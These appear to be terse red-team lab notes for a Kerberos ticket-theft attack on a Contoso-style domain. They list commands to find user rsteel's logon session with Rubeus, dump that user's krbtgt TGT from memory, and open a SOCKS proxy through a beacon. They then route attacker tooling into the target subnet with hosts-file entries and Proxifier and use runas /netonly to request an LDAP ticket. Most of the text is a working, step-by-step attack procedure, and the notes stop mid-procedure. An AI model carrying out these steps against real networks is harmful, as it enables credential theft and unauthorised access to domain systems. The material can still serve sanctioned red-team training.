dump the TGT for desired user (rsteel):
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
    grab the LUID for rsteel/krbtgt (0x1e8e46)
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /user:rsteel /service:krbtgt /nowrap
    store the ticket! doIFqDC...PU08uQ09N
start a socks proxy:
    beacon> socks 1080 socks5
on attacker desktop:
    run the terminal as Admin
    add our static DNS records
        PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
    launch Proxifier
    add team server as new proxy server
        Profile > Proxy Servers
        Add
        Address: 10.0.0.5 (ip from beacon)
        Port: 1080 (same as above)
        Protocol: socks5 (same as above)
    add proxification rule
        Add
        Name: beacon
        target hosts: 10.10.120.0/23
        action: proxy socks5 10.0.0.5
    create LDAP service ticket
        PS C:\Users\Attacker> runas /netonly /user:CONTOSO\rsteel powershell.exe
            use "FakePass"
